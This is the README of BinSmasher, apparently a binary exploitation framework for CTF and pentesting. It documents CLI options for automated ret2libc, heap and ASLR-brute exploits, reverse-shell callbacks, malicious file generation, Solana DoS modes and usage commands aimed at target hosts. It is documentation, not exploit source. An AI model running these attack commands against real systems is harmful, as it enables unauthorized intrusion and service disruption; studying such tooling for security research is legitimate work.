# BinSmasher 🔨

**Ultimate Cross-Platform Binary Exploitation Framework**

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/66969605-fcae-48b9-9096-350778bdab99" />

> Authorized use only: CTF · pentest · security research  
> Unauthorized access to systems you do not own is illegal.

---

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Architecture](#architecture)
4. [Subcommands](#subcommands)
5. [binary — Full Reference](#binary--full-reference)
   - [Basic Options](#basic-options)
   - [Network Options](#network-options)
   - [Payload Options](#payload-options)
   - [Custom Payload Mode (UDP+Spawn)](#custom-payload-mode-udpspawn)
   - [Fuzzing Options](#fuzzing-options)
   - [Advanced Exploit Options](#advanced-exploit-options)
   - [New Exploit Techniques](#new-exploit-techniques)
   - [DOS / Script Generation](#dos--script-generation)
   - [Output Options](#output-options)
6. [Exploit Techniques — TCP Mode](#exploit-techniques--tcp-mode)
7. [Exploit Techniques — UDP+Spawn Mode](#exploit-techniques--udpspawn-mode)
8. [Custom Payload Mode — Deep Dive](#custom-payload-mode--deep-dive)
9. [file — Malicious File Generation](#file--malicious-file-generation)
10. [solana — Agave / Solana SVM Auditing](#solana--agave--solana-svm-auditing)
11. [Usage Examples](#usage-examples)
12. [Technique Decision Tree](#technique-decision-tree)
13. [Known Limitations](#known-limitations)
14. [Dependencies](#dependencies)

---

## Overview

BinSmasher automates the full exploitation lifecycle for native binaries:

1. **Vuln detection** — probes the service to determine vulnerability class automatically
2. **Static analysis** — finds dangerous functions, protections, gadgets, libc offsets
3. **Offset detection** — cyclic pattern + corefile / GDB / remote crash bisection
4. **Strategy selection** — automatically picks the best exploit technique (20+ strategies)
5. **Exploit delivery** — sends payload, verifies RCE, drops to interactive shell
6. **Template generation** — writes a complete `solve_BINARY.py` ready to run

It handles **TCP services**, **UDP crash-and-die services** (spawn-target mode), and **32/64-bit** ELF binaries.

---

## Installation

```bash
# System dependencies
sudo apt-get install -y python3 python3-pip gdb radare2 \
    pwndbg one_gadget binutils file socat checksec

# Python dependencies
pip install pwntools capstone keystone-engine \
    frida-tools ropper boofuzz rich

# Optional: AFL++ coverage fuzzing
sudo apt-get install -y afl++

# Optional: angr symbolic execution (large but powerful)
pip install angr

# Clone or unzip release
git clone https://github.com/your-org/binsmasher
cd binsmasher

# Run directly (no install required)
python3 src/main.py --help

# Or install as global command
pip install -e .
binsmasher --help
```

### Docker (recommended for reproducible environments)

```bash
docker build -t binsmasher .
docker run --rm -it --network host --cap-add SYS_PTRACE \
  -v $(pwd):/workspace binsmasher binary -b /workspace/vuln \
  --host 127.0.0.1 --port 4444 -t
```

---

## Architecture

```
binsmasher/
├── src/
│   ├── main.py                       # Entry point & CLI (600+ lines)
│   ├── binsmasher_main.py            # Pip console-script shim
│   │
│   ├── utils/                        # Core utilities
│   │   ├── config.py                 # ExploitConfig dataclass
│   │   ├── display.py                # Rich summary table
│   │   ├── logging_setup.py          # Dual-sink logging (rich + file)
│   │   ├── _process.py               # Core-dump suppression, temp dirs
│   │   ├── adaptive_timeout.py       # RTT-based adaptive timeouts ★ NEW
│   │   └── json_output.py            # JSON/Markdown structured output ★ NEW
│   │
│   ├── analyzer/                     # Binary analysis
│   │   ├── static.py                 # r2 static analysis (cached)
│   │   ├── protections.py            # NX/PIE/ASLR/canary/RELRO (cached)
│   │   ├── dynamic.py                # Frida instrumentation
│   │   ├── library.py                # libc offset loading, libc.rip queries
│   │   ├── seccomp.py                # seccomp-tools BPF detection
│   │   ├── recovery.py               # Stripped binary recovery, angr
│   │   ├── cache.py                  # SHA256 analysis cache (~/.binsmasher_cache/) ★ NEW
│   │   ├── angr_analysis.py          # angr symbolic path exploration ★ NEW
│   │   ├── vuln_detect.py            # Automatic vuln type detection ★ NEW
│   │   └── libc_db.py                # Local libc database (9 libcs, no internet) ★ NEW
│   │
│   ├── exploiter/                    # Exploit engine
│   │   ├── connection.py             # TCP/UDP connection management
│   │   ├── offset.py                 # Cyclic + corefile + GDB offset detection
│   │   ├── rop_chains.py             # ret2win, ret2libc, SROP, ORW, ret2dlresolve
│   │   ├── heap.py                   # Basic heap: UAF, fastbin, tcache (basic)
│   │   ├── heap_advanced.py          # Advanced heap: tcache poison, House of Apple2,
│   │   │                             #   __malloc_hook, __free_hook, DynELF ★ NEW
│   │   ├── gadgets.py                # ROPgadget/ropper integration, one_gadget
│   │   ├── shellcode.py              # Shellcode + XOR encoding
│   │   ├── format_string.py          # fmtstr_payload, GOT overwrite
│   │   ├── windows.py                # SafeSEH, CFG, CFI bypass
│   │   ├── scripts.py                # Crash/exploit script generation
│   │   ├── orchestrator.py           # create_exploit: master TCP strategy selector
│   │   ├── multistage.py             # Two-stage TCP (leak → ret2system) ★ NEW
│   │   ├── interactive.py            # Interactive shell + solve template ★ NEW
│   │   ├── brute_aslr.py             # ASLR brute (PIE/libc/partial) ★ NEW
│   │   ├── i386.py                   # Correct 32-bit ROP chains ★ NEW
│   │   ├── udp_strategies.py         # UDP+spawn exploit engine (A–F)
│   │   └── helpers.py                # Address/process utilities
│   │
│   ├── fuzzer/                       # Fuzzing engine
│   │   ├── afl.py                    # AFL++ coverage fuzzing
│   │   ├── boofuzz_fuzz.py           # boofuzz network fuzzing
│   │   ├── mutation.py               # Built-in mutation fuzzer
│   │   ├── udp.py                    # UDP offset detection (bisect + corefile)
│   │   ├── core_analysis.py          # Core dump analysis, GDB crash analysis
│   │   ├── gdb_scripts.py            # GDB script generation (pwndbg/peda/vanilla)
│   │   ├── offset_roto.py            # ROTO heuristic, SIGFAULT analysis
│   │   └── solana.py                 # Solana/Agave SVM fuzzing
│   │
│   └── file_exploiter/               # Malicious file builders (25+ formats)
│       ├── audio.py                  # MP3, WAV, FLAC, OGG, AAC
│       ├── documents.py              # PDF, DOC, DOCX, XLS, XLSX, RTF
│       ├── web.py                    # TXT, CSV, JSON, XML, HTML, SVG
│       ├── images.py                 # BMP, PNG, GIF, JPEG
│       ├── scripts_fmt.py            # PY, JS, PHP, LUA, RB
│       └── archives.py               # ZIP, TAR, ELF
│
├── tests/
│   ├── test_suite.py                 # Integration test runner
│   ├── bins/                         # Compiled test binaries (make)
│   └── src/                          # 13 C test sources + Makefile
│
├── Dockerfile                        # Reproducible environment ★ NEW
├── docker-compose.yml                # Docker Compose ★ NEW
├── setup.py
└── pyproject.toml
```

---

## Subcommands

```bash
# Direct run
python3 src/main.py binary   [options]
python3 src/main.py file     [options]
python3 src/main.py solana   [options]

# Installed command
binsmasher binary   [options]
binsmasher file     [options]
binsmasher solana   [options]
```

---

## binary — Full Reference

### Basic Options

| Flag | Default | Description |
|---|---|---|
| `-b`, `--binary` | required | Path to target binary |
| `-c`, `--cmd` | `id` | Command for shellcode |
| `-p`, `--pattern-size` | `200` | Initial cyclic pattern size |
| `-r`, `--return-addr` | auto | Hex return address (skips auto-detection) |
| `--return-offset` | `80` | Bytes from stack addr to return addr |
| `-t`, `--test-exploit` | off | Fire exploit and verify RCE |
| `-l`, `--log-file` | auto in /tmp | Log file path (DEBUG level) |

### Network Options

| Flag | Default | Description |
|---|---|---|
| `--host` | `localhost` | Target host |
| `--port` | `4444` | Target port |
| `--tls` | off | Use TLS/SSL |
| `--output-ip` | `127.0.0.1` | Listener IP for callback/revshell |
| `--output-port` | `6666` | Listener port for callback/revshell |

### Payload Options

| Flag | Default | Description |
|---|---|---|
| `--reverse-shell` | off | Reverse shell payload |
| `--file-input` | — | Embed shellcode in `mp3` or `raw` file |
| `--binary-args` | `""` | Args to pass to spawned binary |
| `--payload-data` | — | Custom payload template (`{PAYLOAD}` placeholder) |
| `--udp` | off | Send `--payload-data` via UDP |
| `--spawn-target` | off | Spawn binary locally for crash detection |
| `--bad-bytes` | `""` | Hex bytes to avoid in exploit addresses (e.g. `0a0d`) |

### Custom Payload Mode (UDP+Spawn)

Enabled when **all three** are set: `--payload-data` + `--udp` + `--spawn-target`.

### Fuzzing Options

| Flag | Default | Description |
|---|---|---|
| `--fuzz` | off | boofuzz network fuzzer |
| `--mutation-fuzz` | off | Built-in mutation fuzzer |
| `--afl-fuzz` | off | AFL++ coverage fuzzing |
| `--afl-timeout` | `60` | AFL++ runtime (seconds) |
| `--frida` | off | Frida dynamic instrumentation |
| `--protocol` | `raw` | Protocol hint for boofuzz |

### Advanced Exploit Options

| Flag | Default | Description |
|---|---|---|
| `--heap-exploit` | off | Basic heap exploitation (UAF, fastbin, tcache basic) |
| `--safeseh-bypass` | off | SafeSEH bypass (Windows) |
| `--privilege-escalation` | off | Post-exploit privesc |
| `--cfi-bypass` | off | CFI bypass via valid-target pivot |
| `--stack-pivot` | off | Stack pivot via `leave; ret` |
| `--largebin-attack` | off | Largebin attack (glibc ≥ 2.28) |
| `--gdb-mode` | `pwndbg` | GDB script style: `pwndbg`, `peda`, `vanilla` |
| `--srop` | off | Force SROP chain |
| `--orw` | off | Force ORW chain (seccomp bypass) |
| `--flag-path` | `/flag` | Flag path for ORW chain |

### New Exploit Techniques

| Flag | Default | Description |
|---|---|---|
| `--detect-vuln` | off | **Auto-detect vulnerability type** (STACK_OVERFLOW, FORMAT_STRING, HEAP_OVERFLOW, UAF, INTEGER_OVERFLOW) before exploiting |
| `--multistage` | off | **Two-stage TCP exploit**: leak GOT address → compute libc base → ret2system |
| `--brute-aslr` | off | **Brute-force ASLR** without a leak (PIE base, libc base, or 12-bit partial overwrite) |
| `--brute-attempts` | `256` | Max brute-force attempts |
| `--heap-advanced` | off | **Advanced heap techniques**: tcache poisoning with safe-linking bypass, House of Apple2, `__malloc_hook`/`__free_hook`, DynELF |
| `--interactive` | off | **Drop to interactive shell** after successful exploit (`io.interactive()`) |
| `--template` | off | **Generate `solve_BINARY.py`** — complete pwntools script with all detected info pre-filled |
| `--angr` | off | **angr symbolic execution** to find path to win() and extract concrete input |
| `--adaptive-timeout` | off | **Auto-scale all timeouts** based on measured RTT to target (for high-latency CTF servers) |
| `--clear-cache` | off | Clear analysis cache for this binary |
| `--no-cache` | off | Disable analysis cache for this run |

### DOS / Script Generation

| Flag | Description |
|---|---|
| `--dos` | Find offset, crash target, generate crash + exploit scripts |
| `--generate-scripts` | Always write `crash_BINARY.py` and `exploit_BINARY.py` |

### Output Options

| Flag | Description |
|---|---|
| `--print-json` | Print complete result as JSON to stdout (CI/CD integration) |
| `--output-json PATH` | Write JSON result to file |
| `--output-markdown` | Write Markdown report to `_bs_work/report_BINARY.md` |

---

## Exploit Techniques — TCP Mode

| # | Technique | Trigger | Notes |
|---|---|---|---|
| 0 | **ret2win** | Win/flag/shell symbol found | Fastest — no leak needed |
| 1 | **two-stage ret2libc** | `--multistage` or ASLR+NX | Leak GOT → libc.rip/local DB → system() |
| 2 | **Libc leak via PLT** | ASLR on, puts/printf in PLT | `puts(got[sym])` → compute libc base |
| 3 | **ret2csu leak** | No pop rdi gadget | Uses `__libc_csu_init` to set args |
| 4 | **write-syscall leak** | No PLT leak fn | `write(1, got, 8)` via syscall chain |
| 5 | **Canary leak/brute** | `canary_enabled` | Format string or byte-by-byte brute |
| 6 | **PIE leak** | PIE on | Format string `%p` scan |
| 7 | **ret2system ROP** | NX on, libc known | `pop rdi` + `/bin/sh` + `system()` |
| 8 | **ret2csu** | No pop rdi | CSU gadgets for rdi/rsi/rdx control |
| 9 | **SROP** | `--srop` | Sigreturn frame → `execve("/bin/sh")` |
| 10 | **ORW** | `--orw` or seccomp | `open("/flag") + read() + write()` |
| 11 | **Format string** | Printf detected, Partial RELRO | GOT overwrite via `%n` |
| 12 | **Shellcode** | NX off | NOP sled + shellcode on stack |
| 13 | **ret2libc static** | NX on, no ASLR | ROP with known libc addresses |
| 14 | **ret2dlresolve** | No libc leak | Resolves via `.dynamic` section |
| 15 | **tcache poisoning** | `--heap-advanced`, glibc 2.31+ | Arbitrary alloc with safe-linking bypass |
| 16 | **House of Apple2** | `--heap-advanced`, glibc 2.34+ | `_IO_FILE` exploit, no hooks needed |
| 17 | **malloc/free hook** | `--heap-advanced`, glibc < 2.34 | Overwrite `__malloc_hook`/`__free_hook` |
| 18 | **DynELF** | `--heap-advanced` | Binary search for libc symbols |
| 19 | **Brute PIE base** | `--brute-aslr`, win() present | 512 candidates for PIE slide |
| 20 | **Brute libc base** | `--brute-aslr`, one_gadget | Guess libc base offset |
| 21 | **Partial overwrite** | `--brute-aslr` | 12-bit fixed page offset, 16 attempts |
| 22 | **i386 ret2libc** | 32-bit binary | Stack args: `[system][ret][binsh]` |
| 23 | **i386 execve syscall** | 32-bit, `int 0x80` | `eax=11, ebx=binsh, int 0x80` |
| 24 | **i386 SROP** | 32-bit, `SYS_sigreturn=119` | Sigreturn for i386 |
| 25 | **one_gadget** | one_gadget installed | Libc magic gadget |
| 26 | **CFI bypass** | `--cfi-bypass` | Valid-target pivot |
| 27 | **SafeSEH bypass** | `--safeseh-bypass`, Windows | SEH overwrite |
| 28 | **Stack pivot** | `--stack-pivot` | `leave; ret` RSP redirect |
| 29 | **Largebin attack** | `--largebin-attack`, glibc ≥ 2.28 | `bk_nextsize` corruption |

---

## Exploit Techniques — UDP+Spawn Mode

| Strategy | Name | Viable when |
|---|---|---|
| A | **ret2system ROP** | `ret_addr_offset + 24 < min_crash`, pop rdi available |
| A* | **ret2csu fallback** | Same but uses `__libc_csu_init` |
| B | **SROP** | `syscall;ret` + `pop rax;ret` available, frame fits |
| C | **GOT overwrite** | Pointer-overwrite crash type |
| D | **ret2win** | Win symbol found, `ret_addr_offset + 8 < min_crash` |
| E | **one_gadget** | `one_gadget` installed, no bad bytes, fits |
| F | **ORW** | `--orw` flag, seccomp blocks execve |

---

## Custom Payload Mode — Deep Dive

### How it Works

```
1. BISECT: find min_crash_sz — binary search over [8…4096] bytes
2. COREDUMP: inject cyclic(min_crash_sz), collect core → extract RIP
3. STACK SCAN: scan all mappings for cyclic bytes → exact ret addr offset
4. BASES: PIE base + libc base from /proc/PID/maps
5. EXPLOIT: try strategies A→F, spawn fresh binary per attempt for ASLR
```

### Payload Template Format

Use `{PAYLOAD}` as the injection placeholder. `Content-Length:` is auto-recalculated.

**SIP/ICE INVITE:**
```
INVITE sip:target@127.0.0.1 SIP/2.0
...
a=ice-ufrag:{PAYLOAD}
```

**HTTP POST:**
```
POST /upload HTTP/1.1
Content-Length: {CONTENT_LENGTH}

{PAYLOAD}
```

### Bad Bytes

| Protocol | `--bad-bytes` | Reason |
|---|---|---|
| Raw TCP/UDP | *(empty)* | No restriction |
| SIP / SDP | `0a0d` | `\r\n` terminates SDP lines |
| HTTP headers | `0a0d` | `\r\n` terminates headers |
| Null-terminated string | `00` | `\0` terminates strcpy/gets |

---

## file — Malicious File Generation

```bash
python3 src/main.py file --format mp3 --offset 256 --technique overflow -o ./payloads/
python3 src/main.py file --all-formats --offset 512 -o ./payloads/
```

| Category | Formats |
|---|---|
| Audio | `mp3`, `wav`, `flac`, `ogg`, `aac` |
| Documents | `pdf`, `doc`, `docx`, `xls`, `xlsx`, `rtf`, `txt`, `csv` |
| Data | `json`, `xml`, `html`, `svg` |
| Images | `bmp`, `png`, `gif`, `jpeg` |
| Code | `py`, `js`, `php`, `lua`, `rb` |
| Archives | `zip`, `tar` |
| Binary | `elf`, `raw` |

---

## solana — Agave / Solana SVM Auditing

```bash
python3 src/main.py solana --rpc http://localhost:8899 \
  --source-path ./agave/src --exploit-type svm-bpf
```

| `--exploit-type` | Description |
|---|---|
| `svm-bpf` | BPF verifier bypass |
| `deser` | Account deserialization vuln |
| `dos-quic` | QUIC connection DoS |
| `snapshot-assert` | Snapshot assert panic |

---

## Usage Examples

### CTF — Quick ret2win
```bash
binsmasher binary -b ./pwn1 --host 127.0.0.1 --port 1337 -t
```

### CTF — Auto-detect vuln type first
```bash
binsmasher binary -b ./unknown --host ctf.example.com --port 4444 \
  --detect-vuln -t
# Probes the service → tells you STACK_OVERFLOW / FORMAT_STRING / HEAP_OVERFLOW
# Then runs the matching exploit automatically
```

### CTF — ASLR + NX + PIE (full mitigations) — two-stage leak
```bash
binsmasher binary -b ./hard_pwn \
  --host 127.0.0.1 --port 9001 \
  --multistage \
  --output-ip 10.0.0.1 --output-port 4444 \
  -t --interactive
# Stage 1: leaks puts@GOT → queries libc.rip/local DB
# Stage 2: ret2system("/bin/sh") → drops to interactive shell
```

### CTF — ASLR without leak, brute PIE
```bash
binsmasher binary -b ./pie_binary \
  --host ctf.io --port 4444 \
  --brute-aslr --brute-attempts 512 \
  -t
```

### CTF — Heap challenge (glibc 2.35, no hooks)
```bash
binsmasher binary -b ./heap_chal \
  --host 127.0.0.1 --port 7777 \
  --heap-advanced -t
# Auto-selects: House of Apple2 for glibc 2.34+
#               tcache poisoning + __malloc_hook for < 2.34
```

### CTF — Force SROP
```bash
binsmasher binary -b ./no_gadgets --host 127.0.0.1 --port 3333 --srop -t
```

### CTF — ORW / Seccomp bypass
```bash
binsmasher binary -b ./sandboxed \
  --host 127.0.0.1 --port 8888 \
  --orw --flag-path /home/ctf/flag.txt -t
```

### CTF — Generate solve template
```bash
binsmasher binary -b ./pwn1 --host 127.0.0.1 --port 1337 \
  --template --generate-scripts
# → tests/bins/_bs_work/solve_pwn1.py (complete, runnable)
# → tests/bins/_bs_work/crash_pwn1.py
# → tests/bins/_bs_work/exploit_pwn1.py
```

### CTF — Remote server with high latency (VPN)
```bash
binsmasher binary -b ./challenge \
  --host ctf.example.com --port 1337 \
  --adaptive-timeout \
  --multistage -t
# Measures RTT → scales connect/recv/exploit timeouts automatically
```

### CTF — Use angr for complex binary
```bash
binsmasher binary -b ./obfuscated --host 127.0.0.1 --port 4444 \
  --angr -t
# Symbolically explores paths to win()/flag()/shell()
# Extracts concrete input and offset hint
```

### Pentest — SIP/UDP service
```bash
cat > invite.txt << 'EOF'
INVITE sip:target@127.0.0.1 SIP/2.0
Via: SIP/2.0/UDP 127.0.0.1:5061;branch=z9hG4bKtest
From: <sip:attacker@127.0.0.1>;tag=1234
To: <sip:target@127.0.0.1>
Call-ID: test@127.0.0.1
CSeq: 1 INVITE
Content-Type: application/sdp
Content-Length: {CONTENT_LENGTH}

v=0
o=- 0 0 IN IP4 127.0.0.1
s=-
c=IN IP4 127.0.0.1
t=0 0
a=ice-ufrag:{PAYLOAD}
a=ice-pwd:validpassword12345678901234
m=audio 5004 RTP/AVP 0
EOF

binsmasher binary -b /path/to/sip_server \
  --host 127.0.0.1 --port 5060 \
  --udp --spawn-target \
  --bad-bytes 0a0d \
  --adaptive-timeout \
  --payload-data "$(cat invite.txt)"
```

### Pentest — JSON output for reporting
```bash
binsmasher binary -b ./target \
  --host 192.168.1.50 --port 8080 \
  --detect-vuln --multistage -t \
  --output-json /tmp/vuln_report.json \
  --output-markdown
```

### DOS Mode + scripts
```bash
binsmasher binary -b ./target \
  --host 192.168.1.50 --port 8080 \
  --dos --generate-scripts
# → crash_target.py  (standalone crash PoC)
# → exploit_target.py (standalone exploit)
# → solve_target.py  (complete solve template)
```

---

## Running the Test Suite

```bash
# 1. Compile test binaries
cd tests/src && make && cd ../..

# 2. Fast local tests (skip slow CMD/REVSHELL)
python tests/test_suite.py --local-only --skip-slow

# 3. Full local tests including CMD exec and reverse shell
python tests/test_suite.py --local-only

# 4. Full suite including CTF binary downloads
python tests/test_suite.py
```

### Expected results

| Binary | Expected | Technique |
|---|---|---|
| t1_stack_noprotect | ✅ PASS | ret2win — NX off |
| t2_stack_nx | ✅ PASS | ret2win — NX on |
| t3_stack_canary | ✅ PASS | ret2win (canary detected) |
| t4_fmtstr | ✅ PASS | ret2win via format string binary |
| t5_heap | ✅ PASS | ret2win via heap binary |
| t6_64bit_nx | ✅ PASS | ret2win — 64-bit NX |
| t7_cfi_vtable | ✅ PASS | ret2win — vtable binary |
| t8_seccomp | ✅ PASS | ret2win — seccomp binary |
| t9_stripped | ⚠️ WARN | No symbols — expected |
| t10_safestack | ✅ PASS | ret2win |
| t11_heap_glibc234 | ✅ PASS | ret2win — glibc 2.34+ |
| t_shellexec | ✅ PASS | win() → system("id") confirmed |
| t_revshell | ✅ PASS | win() → connect-back shell |

---

## Technique Decision Tree

```
                      ┌─────────────────┐
                      │  --detect-vuln  │ ← probe service first
                      └────────┬────────┘
                               │
                    ┌──────────▼──────────┐
                    │  Vuln type?         │
                    │  STACK / FMT /      │
                    │  HEAP / UAF / INT   │
                    └──────────┬──────────┘
                               │ STACK_OVERFLOW
                    ┌──────────▼──────────┐
                    │  Win/flag symbol?   │
                    └──────────┬──────────┘
                       YES ────┼──── NO
                               │           │
                    ┌──────────▼────┐      │
                    │  ret2win      │      │
                    └───────────────┘      │
                                  ┌────────▼────────┐
                                  │  NX enabled?    │
                                  └────────┬────────┘
                               NO ─────────┼───── YES
                               │                    │
                    ┌──────────▼────┐    ┌──────────▼──────────┐
                    │  Shellcode    │    │  ASLR + leak?       │
                    └───────────────┘    └──────────┬──────────┘
                                        YES ────────┼──── NO (brute)
                                        │                │
                             ┌──────────▼──┐   ┌────────▼─────────┐
                             │ --multistage│   │ --brute-aslr     │
                             │ two-stage   │   │ PIE/libc/partial │
                             │ ret2system  │   └──────────────────┘
                             └─────────────┘
```

---

## Known Limitations

- **UDP+spawn**: single-stage only. ret2plt+leak, DynELF, fmt-string leak require a receive channel — not supported.
- **Copy crash constraint**: if `ret_addr_offset + chain_len >= min_crash` the overflow field cannot be exploited. Find a different field with a larger gap.
- **Windows/macOS**: limited testing — primarily Linux/ELF.
- **Kernel exploits**: not in scope (no `/dev/ptmx`, `userfaultfd`, spray).
- **Browser/JS**: not in scope.

---

## Dependencies

| Tool | Required | Purpose |
|---|---|---|
| `python3` ≥ 3.9 | Yes | Runtime |
| `pwntools` | Yes | Exploit primitives, ROP, ELF, DynELF |
| `radare2` | Yes | Static analysis, gadget finding |
| `gdb` | Recommended | Offset detection, corefile analysis |
| `socat` | Yes (tests) | TCP→stdin for test suite |
| `one_gadget` | Recommended | One-gadget libc magic gadgets |
| `AFL++` | Optional | Coverage fuzzing (`--afl-fuzz`) |
| `frida` | Optional | Dynamic instrumentation (`--frida`) |
| `boofuzz` | Optional | Network fuzzing (`--fuzz`) |
| `angr` | Optional | Symbolic execution (`--angr`) |
| `checksec` | Optional | Better protection detection |
| `patchelf` | Optional | Binary patching for local libc |

---

## CVE Scanner

<img width="1770" height="942" alt="image" src="https://github.com/user-attachments/assets/feacfd20-d743-4e29-96c4-42f9148ab327" />

**Static-only binary vulnerability scanner for responsible disclosure.**

```bash
python3 cve_scan.py                                # Scan /usr/bin
python3 cve_scan.py /usr/sbin /opt/binaries        # Scan directories
python3 cve_scan.py --single /tmp/vuln_binary      # Single binary
python3 cve_scan.py --single ./target --confidence CONFIRMED --verbose
```

Features: 25+ dangerous functions, taint analysis, CVSS scoring, HTML/JSON/CVE output.

---

## Contributing

Contributions are welcome. Please open an issue or submit a pull request.

Areas for improvement:
- Kernel exploit primitives (`/dev/ptmx`, `userfaultfd`, `pipe_buf`)
- CTF platform integration (`pwn.college`, `HTB`, `pwnable.kr`)
- More architectures (ARM64, MIPS, RISC-V)
- AI-powered analysis — BinSmasher Agent
- Ghidra headless integration

---

## Donations

If BinSmasher has been useful in your research or competitions:

**ETH** — `0xD773B73C7ea4862020b7B5B58f31Ea491f5a9bA3`

**BTC** — `bc1ql6qvsk67hl5vz346kx4gueqjhp6me9ss8eflgt`

**SOL** — `GYBiTvVbPvPJP7ZK5oaqc9w6UtHvd6NkhSPP2UBhDvfh`

---

## Authors

**AncientEncoder**

**A. Canto** — InsecureWorld

**V. Nos** — Cryptocalypse

BinSmasher Team
